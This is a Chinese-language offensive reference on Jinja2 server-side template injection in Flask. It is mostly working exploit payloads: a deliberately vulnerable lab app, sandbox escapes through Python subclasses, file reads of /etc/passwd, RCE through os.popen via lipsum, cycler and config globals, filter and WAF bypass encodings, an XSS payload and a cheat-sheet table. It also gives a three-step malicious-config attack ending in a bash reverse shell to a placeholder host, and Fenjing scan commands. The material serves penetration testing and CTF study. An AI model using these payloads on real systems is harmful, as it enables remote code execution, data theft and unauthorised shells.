---
attack_surface: [注入类, 编码/序列化滥用]
impact: [远程代码执行, 信息泄露, 权限提升]
risk_level: 严重
prerequisites:
  - Python Flask/Jinja2 基础
  - Python 对象模型理解 (MRO/__mro__/__subclasses__)
related_techniques:
  - ssti-server-side-template-injection
  - python-sandbox-escape
  - command-injection
difficulty: 高级
tools:
  - Fenjing
---

# Jinja2 SSTI 深度利用

> 关联文档：[SSTI 主文档](./README.md) · [EL Expression Language](./EL%20Expression%20Language.md)

---

# 0x01 实验环境

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/")
def home():
    if request.args.get('c'):
        return render_template_string(request.args.get('c'))
    else:
        return "Hello, send something inside the param 'c'!"

if __name__ == "__main__":
    app.run()
```

---

# 0x02 沙箱逃逸方法论

Jinja2 SSTI 的核心目标是**从沙箱环境中逃逸回普通 Python 执行流**。关键桥梁是 `<class 'object'>` — 它是所有类的基类，通过其 `__subclasses__()` 方法可访问所有非沙箱环境中的已加载类。

## 2.1 可访问的全局对象

即使在被限制的模板环境中，以下对象始终可访问：

```
[]
''
()
dict
config
request
lipsum       # Jinja2 内置 global
cycler       # Jinja2 内置 global
joiner       # Jinja2 内置 global
namespace    # Jinja2 内置 global
```

## 2.2 回溯 `<class 'object'>`

从一个类对象出发，通过 `__base__`、`__mro__[-1]` 或 `__mro__()` 回溯到 `<class 'object'>`：

```python
# Step 1: 获取任意类对象
[].__class__
''.__class__
()["__class__"]
request["__class__"]
config.__class__
dict                          # 本身已是一个类

# Step 2: 回溯到 <class 'object'>
dict.__base__
dict["__base__"]
dict.mro()[-1]
dict.__mro__[-1]
(dict|attr("__mro__"))[-1]
(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]

# Step 3: 调用 __subclasses__() 获取所有已加载类
{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}

# 完整链（多路径）
{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
{{ request.__class__.mro()[-1].__subclasses__() }}

# 通过 config
{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}

# 简写形式
{{ [].class.base.subclasses() }}
{{ ''.class.mro()[1].subclasses() }}
```

## 2.3 信息收集

```python
# Dump 所有配置
{{ config }}
{{ config.items() }}

# Debug 语句（需 Debug Extension 开启）
{% debug %}

# 遍历配置项
{% for key, value in config.items() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}

# 敏感信息
{{ settings.SECRET_KEY }}
{{ settings }}
```

---

# 0x03 RCE 利用

## 3.1 文件读写

```python
# ''.__class__.__mro__[1].__subclasses__()[40] = File class (索引可能因环境而异)
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```

## 3.2 直接 RCE (已知索引)

```python
# 第 396 号子类是 <class 'subprocess.Popen'>
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
```

## 3.3 无索引盲扫 — 通过 Builtins 路径

不依赖子类索引号，遍历子类找到含 `__builtins__` 的类即可获得 `__import__`：

```python
# 盲扫 — 通过 'warning' 类名定位
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}
    {{x()._module.__builtins__['__import__']('os').popen("ls").read()}}
  {%endif%}
{% endfor %}

# 盲扫 — 通过 GET 参数传命令
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}
    {{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}
  {%endif%}
{% endfor %}
```

## 3.4 不依赖 `__builtins__` 的 RCE 路径

直接利用 Jinja2 上下文对象：`cycler`、`joiner`、`namespace` 的 `__init__.__globals__` 已包含 `os` 模块：

```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}

# 完整路径版本
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# 通过 lipsum (默认可用 global)
{{ lipsum.__globals__['os'].popen('id').read() }}
```

---

# 0x04 Statement-Tag Payload（`{% ... %}` 逃逸）

当 `{{ ... }}` 被过滤或上下文要求使用 statement 标签时，可用以下技术：

```python
# 基础原语
{% print(1) %}
{% if 7*7 == 49 %}OK{% endif %}
{% if 7*7 == 50 %}BAD{% else %}ELSE{% endif %}
{% set x = 7*7 %}{{ x }}
{% for i in range(3) %}{{ i }}{% endfor %}
{% with a = ''.__class__ %}{{ a }}{% endwith %}
{% print(''.__class__.__mro__[1]) %}
{% with x = ''.__class__.__mro__[1].__subclasses__()|length %}{{ x }}{% endwith %}

# Flask 上下文 — 使用已有 global/function
{% with a = config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("id").read() %}{{ a }}{% endwith %}
{% if config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("id").read().startswith("uid=") %}yes{% endif %}

# 纯 Jinja2 Template 上下文 (无 config/request)
# lipsum、cycler、joiner、namespace 即使在这种情况下也通常可用
{% print(lipsum.__globals__['os'].popen('id').read()) %}
{% with x = lipsum.__globals__['os'].popen('id').read() %}{{ x }}{% endwith %}
{% print(cycler.__init__.__globals__['os'].popen('id').read()) %}
{% print(joiner.__init__.__globals__['os'].popen('id').read()) %}
{% print(namespace.__init__.__globals__['os'].popen('id').read()) %}

# 布尔盲注原语
{% if 'uid=' in lipsum.__globals__['os'].popen('id').read() %}YES{% endif %}
```

**注意**：`{% print %}` 非必需 — `{% with %}`、`{% if %}`、`{% set %}`、`{% for %}` 通常已足够。

---

# 0x05 过滤器绕过技术

## 5.1 基础属性访问绕过

```python
# 无引号
request.__class__
request["__class__"]

# hex 编码绕过
request['\x5f\x5fclass\x5f\x5f']

# attr() filter 绕过
request|attr("__class__")
request|attr(["_"*2, "class", "_"*2]|join)   # join 拼接

# 从请求参数取值
request|attr(request.args.c)                    # ?c=__class__
request|attr(request.headers.c)                 # Header c: __class__
request|attr(request.query_string[2:16].decode()  # query string 切片

# format 拼接
request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))
# ?f=%s%sclass%s%s&a=_

# 列表无方括号
request|attr(request.args.getlist(request.args.l)|join)
# ?l=a&a=_&a=_&a=class&a=_&a=_
```

## 5.2 HTML 编码绕过 (`safe` filter)

Jinja2 默认对输出进行 HTML 编码，"safe" filter 可绕过以实现 XSS：

```python
{{'<script>alert(1);</script>'|safe}}
# 输出: <script>alert(1);</script>  (不被编码)
```

---

# 0x06 无 `{{ . [ ] _ }}` 的极端绕过

```python
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}
```

---

# 0x07 不依赖 `<class 'object'>` 的方法

从 `config` 或 `request` 的 `__dict__` 中找到函数对象，直接访问其 `__globals__.__builtins__`：

```python
# 探索可用函数
{{ request.__class__.__dict__ }}     # application, _load_form_data, on_json_loading_failed
{{ config.__class__.__dict__ }}      # __init__, from_envvar, from_pyfile, from_object...

# 通过函数拿到 builtins
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
{{ (config|attr("__class__")).from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}

# import_string 快捷方式 (无需显式访问 builtins)
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}

# 使用 {% with %} 无引号/无方括号变体
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls")["read"]() %} {{ a }} {% endwith %}
```

---

# 0x08 恶意配置文件 RCE

通过文件写入类创建恶意 Python 配置文件，再让 Flask 加载它：

```python
# Step 1: 写入恶意 config
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# Step 2: 加载恶意 config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}

# Step 3: 通过恶意 config 执行命令
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```

---

# 0x09 Fenjing — Jinja2 WAF 绕过工具

[Fenjing](https://github.com/Marven11/Fenjing) 专精于 Jinja2 CTF 场景下的 WAF 过滤器检测与绕过，也可用于真实环境爆破：

```bash
# web UI (默认端口 11451)
python -m fenjing

# 全站扫描 — 提取所有 form 并攻击
python -m fenjing scan --url 'http://xxx/'

# 攻击特定 form
python -m fenjing crack --url 'http://xxx/' --method GET --inputs name

# 攻击特定路径 (如 /hello/<payload>)
python -m fenjing crack-path --url 'http://xxx/hello/'

# 读取请求文件攻击
python -m fenjing crack-request --url 'http://xxx/' --file request.txt
```

工作原理：喷洒字符和关键词检测过滤器规则，自动搜索 WAF 未覆盖的绕过路径，成功后提供交互式控制台。

---

# 0x0A 关键 Payload 速查

| 场景 | Payload |
|------|---------|
| 最简 RCE | `{{ cycler.__init__.__globals__.os.popen('id').read() }}` |
| 无 `{{` `}}` | `{% print(lipsum.__globals__['os'].popen('id').read()) %}` |
| 无 `.` `[` `]` `_` | `{%with a=request\|attr("application")\|attr("\x5f\x5fglobals\x5f\x5f")\|...%}{%print(a)%}{%endwith%}` |
| 不依赖 `__builtins__` | `{{ lipsum.__globals__['os'].popen('id').read() }}` |
| 盲扫子类 | `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}` |
| 文件读取 | `{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}` |
| 配置文件 RCE | 三步操作（写入 → 加载 → 调用） |

---

# 0x0B 参考资料

- [PortSwigger Research — Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection)
- [Jinja2 官方文档 — Templates](https://jinja.palletsprojects.com/en/stable/templates/)
- [Jinja2 官方文档 — Sandbox](https://jinja.palletsprojects.com/en/stable/sandbox/)
- [PayloadsAllTheThings — Jinja2 SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
- [Python Sandbox Escape — Bypass Python Sandboxes](https://github.com/carlospolop/hacktricks/tree/master/generic-methodologies-and-resources/python/bypass-python-sandboxes)
- [Fenjing — Jinja2 WAF Bypass Tool](https://github.com/Marven11/Fenjing)
- [HackMD — Jinja2 SSTI Notes (Chivato)](https://hackmd.io/@Chivato/HyWsJ31dI)
